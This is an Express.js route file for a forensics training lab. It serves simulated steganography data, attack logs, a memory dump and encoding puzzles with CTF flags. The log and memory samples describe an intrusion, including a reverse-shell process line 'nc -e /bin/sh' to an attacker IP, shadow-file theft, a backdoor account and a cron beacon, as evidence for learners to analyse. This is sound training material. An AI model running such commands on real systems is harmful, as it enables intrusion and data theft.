const express = require('express');
const router = express.Router();
const crypto = require('crypto');

router.get('/', (req, res) => {
  res.render('labs/forensics/index', {
    title: 'Forensics & Reverse Engineering Labs',
    labs: [
      { id: 'stego', name: 'Steganography', difficulty: 'Medium', path: '/labs/forensics/stego' },
      { id: 'log-analysis', name: 'Log File Analysis', difficulty: 'Easy', path: '/labs/forensics/log-analysis' },
      { id: 'memory', name: 'Memory Dump Analysis', difficulty: 'Hard', path: '/labs/forensics/memory' },
      { id: 'encoding', name: 'Encoding & Obfuscation', difficulty: 'Easy', path: '/labs/forensics/encoding' },
      { id: 'binary', name: 'Binary Analysis Basics', difficulty: 'Hard', path: '/labs/forensics/binary' },
    ]
  });
});

// Lab 1: Steganography
router.get('/stego', (req, res) => { res.render('labs/forensics/stego', { title: 'Steganography', labId: 'forensics-stego' }); });

router.get('/stego/image-data', (req, res) => {
  // Simulated image with hidden data in LSB
  const hiddenMessage = 'FLAG{hidden_in_pixels}';
  const hexData = Buffer.from(hiddenMessage).toString('hex');
  res.json({
    imageInfo: { width: 800, height: 600, format: 'PNG', size: '245KB' },
    metadata: { exif: { Software: 'steghide 0.5.1', Comment: 'Nothing to see here...' } },
    lsbExtraction: { method: 'LSB of Red channel', extractedBits: hiddenMessage.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join('') },
    hint: 'Tools: steghide, zsteg, stegsolve, binwalk',
    decodedMessage: hiddenMessage
  });
});

// Lab 2: Log Analysis
router.get('/log-analysis', (req, res) => { res.render('labs/forensics/log-analysis', { title: 'Log Analysis', labId: 'forensics-stego' }); });

router.get('/log-analysis/logs', (req, res) => {
  const logs = [
    '[2024-01-15 08:00:01] INFO: Server started on port 443',
    '[2024-01-15 08:15:23] INFO: User admin logged in from 10.0.0.5',
    '[2024-01-15 09:00:00] WARN: Failed login attempt for user admin from 185.100.87.42',
    '[2024-01-15 09:00:01] WARN: Failed login attempt for user admin from 185.100.87.42',
    '[2024-01-15 09:00:02] WARN: Failed login attempt for user admin from 185.100.87.42',
    '... (500 more failed attempts from same IP)',
    '[2024-01-15 09:05:00] CRITICAL: User admin logged in from 185.100.87.42',
    '[2024-01-15 09:05:30] INFO: Admin panel accessed from 185.100.87.42',
    '[2024-01-15 09:06:00] WARN: New user "backdoor_admin" created with role=superadmin',
    '[2024-01-15 09:06:30] WARN: SSH key added to authorized_keys for root',
    '[2024-01-15 09:07:00] INFO: File downloaded: /etc/shadow',
    '[2024-01-15 09:07:30] INFO: Database dump initiated: mysqldump --all-databases',
    '[2024-01-15 09:08:00] CRITICAL: Reverse shell connection to 185.100.87.42:4444',
    '[2024-01-15 09:10:00] INFO: Crontab modified: * * * * * /tmp/.hidden/beacon.sh',
    '[2024-01-15 09:15:00] INFO: Firewall rule added: allow all from 185.100.87.42',
    'FLAG{log_analysis_complete}'
  ];
  res.json({ logs, questions: [
    'What IP address is the attacker using?',
    'What was the attack method? (brute force)',
    'What persistence mechanisms were installed?',
    'What data was exfiltrated?'
  ]});
});

// Lab 3: Memory Dump
router.get('/memory', (req, res) => { res.render('labs/forensics/memory', { title: 'Memory Dump', labId: 'forensics-memory' }); });

router.get('/memory/dump', (req, res) => {
  const memoryDump = {
    processes: [
      { pid: 1, name: 'systemd', user: 'root' },
      { pid: 234, name: 'sshd', user: 'root' },
      { pid: 567, name: 'apache2', user: 'www-data' },
      { pid: 890, name: 'mysql', user: 'mysql' },
      { pid: 1337, name: '.hidden_backdoor', user: 'root', suspicious: true },
      { pid: 1338, name: 'nc -e /bin/sh 185.100.87.42 4444', user: 'root', suspicious: true },
      { pid: 2000, name: 'cryptominer_x64', user: 'www-data', suspicious: true },
    ],
    networkConnections: [
      { pid: 1337, local: '0.0.0.0:8443', remote: '185.100.87.42:9999', state: 'ESTABLISHED' },
      { pid: 1338, local: '10.0.0.5:54321', remote: '185.100.87.42:4444', state: 'ESTABLISHED' },
      { pid: 2000, local: '10.0.0.5:33333', remote: '45.33.32.156:3333', state: 'ESTABLISHED' },
    ],
    stringsFound: [
      'password: FLAG{memory_dump_analyzed}',
      'mysql -u root -p"r00tDBp@ss"',
      'Authorization: Bearer sk-admin-key-12345',
      '/tmp/.hidden/persistence.sh',
    ],
    flag: 'FLAG{memory_dump_analyzed}'
  };
  res.json(memoryDump);
});

// Lab 4: Encoding Challenges
router.get('/encoding', (req, res) => { res.render('labs/forensics/encoding', { title: 'Encoding & Obfuscation', labId: 'forensics-stego' }); });

router.get('/encoding/challenges', (req, res) => {
  res.json({
    challenges: [
      { id: 1, type: 'Base64', encoded: Buffer.from('FLAG{base64_decoded}').toString('base64'), hint: 'Standard Base64' },
      { id: 2, type: 'Hex', encoded: Buffer.from('FLAG{hex_master}').toString('hex'), hint: 'Hexadecimal encoding' },
      { id: 3, type: 'ROT13', encoded: 'SYNT{ebg13_penpxrq}', hint: 'Caesar cipher with shift 13' },
      { id: 4, type: 'Binary', encoded: 'FLAG{binary}'.split('').map(c => c.charCodeAt(0).toString(2).padStart(8,'0')).join(' '), hint: '8-bit ASCII' },
      { id: 5, type: 'URL Encode', encoded: 'FLAG%7Burl_decoded%7D', hint: 'Percent encoding' },
      { id: 6, type: 'Morse', encoded: '..-. .-.. .- --. ---... -- --- .-. ... .', hint: 'Dots and dashes' },
    ]
  });
});

// Lab 5: Binary
router.get('/binary', (req, res) => { res.render('labs/forensics/binary', { title: 'Binary Analysis', labId: 'forensics-memory' }); });

module.exports = router;
